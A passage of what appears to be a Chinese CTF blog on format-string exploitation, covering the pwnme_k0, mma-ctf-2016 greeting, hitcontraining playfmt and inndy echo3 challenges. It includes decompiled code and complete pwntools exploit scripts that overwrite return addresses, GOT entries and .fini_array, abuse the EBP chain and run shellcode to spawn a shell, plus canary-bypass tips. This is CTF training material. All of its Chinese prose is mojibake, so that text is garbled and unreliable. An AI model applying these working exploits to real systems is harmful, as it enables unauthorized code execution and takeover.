(0x400000)</code></pre><p>64ä½ç¨‹åºï¼Œä¸”å¼€å¯äº†RELROä¿æŠ¤ï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹gotè¡¨äº†ã€‚</p><h5 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><p>è¿™ä¸ªç¨‹åºå®ç°äº†ä¸€ä¸ªæ³¨å†Œç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ³¨å†Œå¥½åå¯ä»¥æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå’Œé€€å‡ºç¨‹åºã€‚å…¶ä¸­åœ¨å±•ç¤ºç”¨æˆ·ä¿¡æ¯å½“ä¸­ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>å¹¶ä¸”å‘ç°å…¶ä¸­è¾“å‡ºçš„bufå°±æ˜¯ä½ è¾“å…¥çš„å¯†ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p><p>è¿˜å‘ç°å…¶ä¸­æœ‰ä¸ªåé—¨å‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p><p>ä¼šè°ƒç”¨systemå‡½æ•°ç»™ä½ shellï¼Œé‚£æ”»å‡»æ€è·¯ä¹Ÿå°±æ˜¯å»ä¿®æ”¹ç¨‹åºä¸­æŸä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œç›´æ¥è¿”å›åˆ°è¿™é‡Œå°±æ‹¿åˆ°shelläº†ã€‚</p><h5 id="gdbè°ƒè¯•ï¼š"><a href="#gdbè°ƒè¯•ï¼š" class="headerlink" title="gdbè°ƒè¯•ï¼š"></a>gdbè°ƒè¯•ï¼š</h5><p>å®šä½åˆ°è¿™ä¸ªå­˜åœ¨æ¼æ´çš„printfå½“ä¸­ï¼Œç¡®å®šä¸€ä¸‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼Œè¾“å…¥çš„usenameå¯ä»¥ç¡®å®šåç§»æ˜¯8ï¼Œå¹¶ä¸”rdiä¹Ÿæ˜¯æŒ‡å‘äº†å­˜æ”¾passwordçš„åœ°å€ã€‚</p><p>ç„¶åå‘ç°æ ˆä¸Šä¹Ÿæœ‰å¾ˆå¤šæ ˆçš„åœ°å€ä¿¡æ¯ï¼Œå½“ç¨‹åºç¬¬äºŒæ¬¡è¿è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œå‘ç°è¿™é‡Œespå¯¹åº”çš„åœ°å€ä¿¡æ¯ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ã€‚æ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ³„æ¼è¿™é‡Œçš„å€¼æ¥ç®—å‡ºå­˜æ”¾ret addressçš„æ ˆåœ°å€ã€‚</p><p>ç„¶åè®©ç¨‹åºè¿è¡Œåˆ°ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯çš„å‡½æ•°ï¼Œè¿™ä¸‹æŠŠret addressçš„pointæ”¾åˆ°æ ˆä¸Šï¼Œæ¥ç€å°±å¯ä»¥å¼€å§‹ä¿®æ”¹ret addressçš„å€¼äº†ã€‚</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h3 id="ä¿®æ”¹FINI-ARRAYåŒº"><a href="#ä¿®æ”¹FINI-ARRAYåŒº" class="headerlink" title="ä¿®æ”¹FINI_ARRAYåŒº"></a>ä¿®æ”¹<code>FINI_ARRAY</code>åŒº</h3><p>åœ¨ä¸Šé¢çš„ä¸¤ä¸ªä¾‹å­ä¸­å¯ä»¥å‘ç°,ä¹‹æ‰€ä»¥èƒ½æˆåŠŸåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´getshell,å¾ˆå¤šæ—¶å€™éƒ½æ˜¯å› ä¸ºç¨‹åºä¸­å­˜åœ¨å¾ªç¯ï¼Œè®©æˆ‘ä»¬å¯ä»¥å¤šæ¬¡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚å¦‚æœç¨‹åºä¸­ä¸å­˜åœ¨å¾ªç¯å‘¢?åˆ©ç”¨ROPåŠ«æŒå‡½æ•°è¿”å›åœ°å€åˆ°startå¯ä»¥å®ç°ï¼›å½“å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œä½¿ç”¨è¿™ä¸ªæ¼æ´ä¹Ÿåšåˆ°è¿™ä¸€<br>ç‚¹ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>ç®€å•åœ°è¯´,ä¸€ä¸ªç¨‹åºåœ¨è°ƒç”¨ mainå‡½æ•°å‰ä¼šè°ƒç”¨<code>.init</code>æ®µä»£ç å’Œ <code>.init_array</code> æ®µçš„å‡½æ•°æ•°ç»„ä¸­æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚åŒæ ·çš„,main å‡½æ•°ç»“æŸåä¹Ÿä¼šè°ƒç”¨<code>.fini</code>æ®µä»£ç å’Œ <code>.fini_arrary</code> æ®µçš„å‡½æ•°æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>å…¶ä¸­<code>FINI_ARRAY</code>åŒºï¼šç¨‹åºç»“æŸéœ€è¦ç»è¿‡è¿™é‡Œï¼Œæ˜¯å¯ä»¥ä¿®æ”¹ä¸€ä¸‹è¿™é‡Œçš„ææ„å‡½æ•°ã€‚ä¿®æ”¹<code>.fini_array</code>åŒºçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºstartï¼Œå°±å¯ä»¥å®ç°è®©ç¨‹åºä»å¤´å†æ¥ä¸€æ¬¡ï¼Œä¹Ÿå°±åˆå¯ä»¥ç”¨ä¸€æ¬¡æ¼æ´ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯,è¿™ä¸ªåŒºçš„å†…å®¹åœ¨å†æ¬¡ä»startå¼€å§‹æ‰§è¡Œååˆä¼šè¢«ä¿®æ”¹ã€‚</p><h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="ä¿æŠ¤å’Œarch-2"><a href="#ä¿æŠ¤å’Œarch-2" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><pre><code>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+1Ch] [ebp-84h]  char v5; // [esp+5Ch] [ebp-44h]  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(&amp;v5, 64) )    return puts(&quot;Don&#39;t ignore me ;( &quot;);  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);  return printf(&amp;s);}</code></pre><p>å‘ç°å‡½æ•°åœ¨è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»¥åå°±ç»“æŸäº†ï¼Œæ²¡æœ‰åœ¨è°ƒç”¨å…¶ä»–çš„å‡½æ•°ï¼Œä¹Ÿå°±æ— æ³•åˆ©ç”¨GOTåŠ«æŒæˆ–è€…ä¿®æ”¹ret addrã€‚<br>å†çœ‹ä¸‹getnlineå‡½æ•°ï¼š</p><pre><code class="c">size_t __cdecl getnline(char *s, int n){  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);}</code></pre><p>å‘ç°æœ‰äº†strlençš„å‡½æ•°ï¼Œå¹¶ä¸”å…¶å‚æ•°ä¹Ÿæ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚<br>è¿™å°±æœ‰äº†æ”»å‡»æ€è·¯ï¼Œåœ¨è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´æ—¶ï¼š</p><ul><li>ä¿®æ”¹<code>.fini_array</code>åŒºçš„ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆåœ°å€ä¸ºstartï¼Œè®©å…¶é‡å¯è·‘ä¸€æ¬¡ç¨‹åº</li><li>å› ä¸ºçŸ¥é“è‚¯å®šä¼šè·‘åˆ°strlené‚£é‡Œï¼Œæ‰€ä»¥åœ¨åŠ«æŒstrlençš„GOTä¸ºsystem</li><li>å¾…ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œå°±åœ¨ä¼ é€ä¸€ä¸ª<code>/bin/sh</code>å³å¯</li></ul><p>æ³¨æ„çš„æ˜¯,è¿™ä¸ª<code>.fini_array</code>åŒºçš„å†…å®¹åœ¨å†æ¬¡ä»startå¼€å§‹æ‰§è¡Œååˆä¼šè¢«ä¿®æ”¹,ä¸”ç¨‹åºå¯è¯»å–çš„å­—èŠ‚æ•°æœ‰é™,å› æ­¤éœ€è¦åŒæ—¶ä¿®æ”¹ä¸¤ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œè¿™ä¸ªé¢˜å¹¶ä¸”éœ€è¦åˆç†è°ƒæ•´payloadã€‚</p><h5 id="gdbè°ƒè¯•-1"><a href="#gdbè°ƒè¯•-1" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªé¢˜ç›®å› ä¸ºå‰é¢æœ‰</p><pre><code class="c">sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);</code></pre><p>æ‰€ä»¥å…¶æ ˆä¸Šä¼šæ”¾ä¸Š<code>Nice to meet you,</code>çš„å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„å¯¹é½ã€‚å¯¹é½åå‘ç°åç§»ä¸º12ï¼Œåœ¨å†™payloadçš„æ—¶å€™å¯ä»¥ä½¿ç”¨å•æ¬¡printfå¤šæ¬¡å†™å…¥çš„è„šæœ¬ï¼Œæ‰€ä»¥æ¥<code>().ljust(0x32,&#39;a&#39;)</code> ,æ‰€ä»¥åç§»éœ€è¦åŠ ä¸Š<code>(0x32 - 2)/4</code> =  24 </p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./greeting&#39;)# io = remote(&#39;111.198.29.45&#39;,42729)elf = ELF(&#39;./greeting&#39;)strlen_got = 0x08049A54fini_array = 0x08049934start = 0x080484F0system_plt = 0x08048490offset = 12def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultkey1 = 0x08048490prev = 18 #æ³¨æ„è¿™ä¸ªé¢˜åœ¨å¯æ§æ ¼å¼åŒ–å­—ç¬¦ä¸²å‰æœ‰å­—ç¬¦è¾“å‡ºpayload = &quot;&quot;for i in range(2):    payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xffffkey2 = 0x84F0for i in range(1):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x32,&#39;a&#39;)payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array)io.recvuntil(&#39;name...&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;name...&#39;)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="å°tips"><a href="#å°tips" class="headerlink" title="å°tips"></a>å°tips</h3><h4 id="ç»•è¿‡canary"><a href="#ç»•è¿‡canary" class="headerlink" title="ç»•è¿‡canary"></a>ç»•è¿‡canary</h4><p>å¯ä»¥åˆ©ç”¨fmtæ¼æ´ï¼Œä»»æ„è¯»çš„ç‰¹æ€§ï¼Œåœ¨æœ‰canaryçš„ç¨‹åºä¸­ï¼Œç®—å¥½åç§»ä»¥åè¯»å‡ºcanaryå­˜çš„æ£€éªŒå€¼ï¼ˆåŸºæœ¬éƒ½æ˜¯ä»¥00ç»“å°¾æ¯”è¾ƒå¥½æ‰¾ï¼‰ï¼Œç„¶ååœ¨buffer overflow æ—¶ï¼Œåœ¨å¯¹åº”ä½ç½®å¡«ä¸Šcanaryæ£€éªŒå€¼ï¼Œå³å¯ç»•è¿‡canaryã€‚</p><h4 id="printfå®¶æ—çš„å…¶ä»–å‡½æ•°"><a href="#printfå®¶æ—çš„å…¶ä»–å‡½æ•°" class="headerlink" title="printfå®¶æ—çš„å…¶ä»–å‡½æ•°"></a>printfå®¶æ—çš„å…¶ä»–å‡½æ•°</h4><p>é¦–å…ˆè¦è®°å¾—ä¸€ç‚¹å‡½æ•°å‚æ•°çš„å…¥æ ˆé¡ºåºï¼Œå¤§å¤šæ˜¯ä»å³åˆ°å·¦ä¾æ¬¡å…¥æ ˆï¼Œåœ¨é‡åˆ°å…¶ä»–çš„printfç±»å‡½æ•°ï¼Œåœ¨ç¡®å®šåç§»æ—¶ï¼Œä¸€å®šè¦è¦æŠŠæ¡fmtæ˜¯åœ¨æ ˆä¸Šçš„é‚£ä¸ªä½ç½®ï¼Œç„¶åè¿›è¡Œè®¡ç®—åç§»ï¼ˆä¸èƒ½ç®€å•çš„åˆ©ç”¨pwndbgçš„fmtargäº†ï¼‰ã€‚</p><ul><li>fprintfï¼šåŸºæœ¬ä¸Šä¸€æ ·ï¼Œåªæ˜¯format string ä¸åœ¨ç¬¬ä¸€å‚æ•°ï¼Œä½¿å¾—overwrite function table æ—¶å¾ˆéš¾ä½¿ç”¨</li><li>sprintfï¼šå¯ä»¥ç”¨%xxc æ¥é€ æˆæ–°çš„buffer overflow </li></ul><h4 id="åŠ«æŒ-stack-chk-fail"><a href="#åŠ«æŒ-stack-chk-fail" class="headerlink" title="åŠ«æŒ__stack_chk_fail"></a>åŠ«æŒ<code>__stack_chk_fail</code></h4><ul><li>åœ¨æ— æ³• stack overflow ä¹Ÿæ²¡æœ‰å…¶å®ƒå‡½æ•°å¯ä»¥åŠ«æŒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¿®æ”¹<code>__stack_chk_fail</code> çš„ G0T å¹¶ä¸”ç ´å canary ä½¿è¿™ä¸ªå‡½æ•°è¢«callï¼Œç„¶åjmpæƒ³è¦çš„ç›®æ ‡åœ°å€</li><li>åœ¨åªæœ‰ä¸€æ¬¡ stack overflow+fmt æ—¶å¯ä»¥å°†<code>__stack_chk_fail</code>æ”¹æˆç›´æ¥ret ï¼Œè¿™æ ·stack overflow æ—¶å¯ä»¥æ— è§†canary ï¼Œä¹Ÿå¯ä»¥æ”¾ä¸ŠROPé“¾ï¼Œè¿›è€Œè¿›å…¥ä¹‹åçš„ROPã€‚</li></ul><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š</h2><p>æœ‰æ—¶å€™å¹¶ä¸ä¼šè¿™ä¹ˆåˆšå¥½ format string çš„ buf åœ¨æ ˆä¸Šå½“å…¶åœ¨ data, bss æˆ–æ˜¯ heap ä¸Šçš„æƒ…å†µï¼Œæ— æ³•åœ¨ stack ä¸­æ”¾ä¸Šä¸€ä¸ª address ç»™ä»»æ„è¯»å†™çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åœ¨  stack ä¸Šç°æœ‰çš„ pointer è¿›è¡Œå†™å€¼ã€‚å…¶ä¸­æœ€å¸¸ç”¨çš„å°±æ˜¯æ ˆä¸Šç°æœ‰çš„EBPé“¾ã€‚</p><h3 id="EBPé“¾"><a href="#EBPé“¾" class="headerlink" title="EBPé“¾"></a>EBPé“¾</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p><p>æ­£å¦‚è¿™ä¸ªå›¾ï¼Œå½“ä¸€ä¸ªç¨‹åºå®Œæˆäº†ç”±mainâ€”&gt;Aâ€”&gt;Bçš„å‡½æ•°è°ƒç”¨ï¼Œæ ˆä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªEBPé“¾ï¼Œåƒå›¾ä¸­çš„ebp3(B)â€”&gt;ebp2(A)â€”&gt;ebp1(main)ï¼Œç„¶å</p><ul><li>é€šè¿‡æ‰¾å‡†offset1(ç®—ä¸€ä¸‹ebp3ä¸fmtå­—ç¬¦ä¸²è·ç¦»)å¯¹EBP2ä½¿ç”¨%hhnï¼Œå°±å¯ä»¥ä¿®æ”¹åˆ°EBP1çš„æœ€ä½ä½ï¼Œä½¿å¾—EBP1åœ¨ä¸€ä¸ª256çš„èŒƒå›´å†…è¿›è¡Œå˜åŒ–ï¼Œå¯ä»¥æ”¹æˆä½ æƒ³è¦ä¿®æ”¹çš„æ ˆå†…å­˜å•å…ƒæŒ‡é’ˆï¼ˆæ¯”å¦‚ret addressçš„æ ˆæŒ‡é’ˆï¼‰ã€‚</li><li>æ”¹å†™å¥½EBP1åï¼Œæ‰¾å‡†offset2 (ç®—ä¸€ä¸‹EBP2ä¸fmtå­—ç¬¦ä¸²è·ç¦»)å†å¯¹EBP1ä½¿ç”¨%hhnæˆ–è€…%hnï¼Œå³å¯å®Œæˆå¯¹ä½ æƒ³è¦ä¿®æ”¹çš„åœ°å€çš„å†™å€¼ã€‚</li></ul><p>ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªæ”»å‡»è¿‡ç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨æ¼æ´æ˜¯æ„é€ å‡ºæˆ‘ä»¬è¦è¯»å†™çš„åœ°å€ï¼Œå†ä¸€æ¬¡åˆ™æ˜¯å¯¹å‰é¢æ„é€ å‡ºæ¥çš„åœ°å€è¿›è¡Œä»»æ„è¯»å†™ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>åœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­ä¸€å®šè¦å­¦ä¼šå¯¹æ ˆä¸Šçš„å·²æœ‰æ•°æ®çš„çµæ´»çš„è¿ç”¨</strong>ã€‚</p><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸ªé¢˜æ¥ä»”ç»†åˆ†æä¸€ä¸‹</p><h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="ä¿æŠ¤å’Œarch-3"><a href="#ä¿æŠ¤å’Œarch-3" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚</p><h5 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>å…¶ä¸­çœ‹åˆ°bufåœ¨bssæ®µï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>è¿™å°±æ˜¯ä¸åœ¨æ ˆä¸Šï¼Œä¸èƒ½è·Ÿå‰é¢çš„é¢˜ç›®ä¸€æ ·ï¼Œç›´æ¥åœ¨æ ˆä¸Šå†™ä¸Šåœ°å€ï¼Œç„¶åæ¥å®Œæˆæ”»å‡»ã€‚</p><p>ä¸Šå±‚æœ‰main å’Œplayå‡½æ•°ï¼Œä¸€å…±ä¸‰å±‚ï¼Œä¸”åœ¨ç¬¬ä¸‰å±‚çš„do-fmtå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç”¨ebpé“¾æ¥å®Œæˆæ”»å‡»ã€‚ç„¶åï¼Œæœ‰æ— é™æ¬¡çš„è§¦å‘è¿™ä¸ªæ¼æ´çš„æœºä¼šã€‚</p><p>æ”»å‡»æ€è·¯ ï¼šå› ä¸ºæ²¡æœ‰å¼€nxä¿æŠ¤ï¼Œå¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»ã€‚ä¿®æ”¹æŸä¸ªå‡½æ•°è¿”å›åœ°å€ï¼Œç„¶åæå‰åœ¨å¯æ§çš„bufåˆé€‚çš„åœ°æ–¹æ‘†ä¸Šshellcodeï¼Œç„¶åè·³ä¸Šå»å³å¯ã€‚</p><h5 id="gdbè°ƒè¯•-2"><a href="#gdbè°ƒè¯•-2" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><p>å®šä½åˆ°printfå‡½æ•°å¤„ï¼š</p><pre><code>gdb-peda$ b *0x0804854FBreakpoint 1 at 0x804854f</code></pre><p>å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>espå¯„å­˜å™¨ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå°±æŠŠ<code>0xffffd338</code>å«åšebp3ï¼Œ<code>0xffffd348</code>ä¸ºebp2ï¼Œ<code>0xffffd358</code>ä¸ºebp1ã€‚</p><p>ç¬¬ä¸€æ¬¡ä¿®æ”¹ï¼šå¯¹ebp2ä½¿ç”¨<code>%xxhhn</code>ä¿®æ”¹ebp1ä¸ºdo-fmtå‡½æ•°çš„retaddr <code>0xffffd33c</code>çš„<strong>æ ˆæŒ‡é’ˆ</strong>ï¼ˆè¿™ä¸ªæ ˆæŒ‡é’ˆå¯ä»¥é€šè¿‡leakä¸€ä¸ªæ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºæ¥ï¼‰</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p><p>ç¬¬äºŒæ¬¡ä¿®æ”¹ ï¼š å¯¹ebp1ä½¿ç”¨<code>%xxhn</code> ä¿®æ”¹retaddr <code>0x80485ad</code> ä¸ºä½ åœ¨bufå¤„æå‰æ‘†ä¸Šçš„shellcode</p><p>è¿™æ ·ç¨‹åºåœ¨é€€å‡ºè¿™ä¸ªdo-fmtå‡½æ•°å°±ä¼šjmpåˆ°shellcodeä¸Šï¼Œè¿™æ ·å°±æ‹¿åˆ°shelläº†ã€‚</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯å¾ˆå•çº¯çš„ç›´æ¥åˆ©ç”¨ebpé“¾è¿›è¡Œæ”»å‡»å³å¯ã€‚</p><p>ç„¶åå†çœ‹ä¸€ä¸ªæœ‰ç‚¹ä¸ä¸€æ ·çš„é¢˜ç›®ï¼š</p><h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="ä¿æŠ¤å’Œarch-4"><a href="#ä¿æŠ¤å’Œarch-4" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h4><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h4 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p><p>è¿™ä¸€å¤„ä¼šè®©æ ˆç»“æ„çš„æƒ…å†µå˜å¾—æ— æ³•é¢„æµ‹ã€‚ç„¶åè¿›å…¥hardfmtï¼š</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>è¿™ä¸€å¤„å­˜åœ¨fmtæ¼æ´ï¼Œä¸”å¾€ä¸‹çœ‹æ•´ä¸ªç¨‹åºæ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½åˆ©ç”¨çš„ï¼Œæ²¡ä»€ä¹ˆåé—¨å‡½æ•°ã€‚é‚£æ”»å‡»æ€è·¯å°±å¯ä»¥æ˜¯ï¼š<strong>æ”¹printfçš„gotè¡¨ï¼Œç„¶ååœ¨ç¬¬5æ¬¡ä¼ è¿‡å»<code>/bin/sh</code>å³å¯ã€‚</strong><br>ï¼ˆè¿™ä¸ªé¢˜ç›®æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯æ ˆçš„éšæœºåŒ–ï¼Œè¿˜æœ‰å› ä¸ºè¿™ä¸ªæ¬¡æ•°çš„é™åˆ¶ï¼Œåœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œè¦å……åˆ†çš„åˆ©ç”¨æ¯ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©è¿™ä¸ªé¢˜ç›®ä¸æ˜¯å¾ˆå®¹æ˜“åšï¼‰</p><h4 id="gdbåˆ†æ"><a href="#gdbåˆ†æ" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h4><p>å®šä½åˆ°æ¼æ´printfå‡½æ•°å¤„ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" 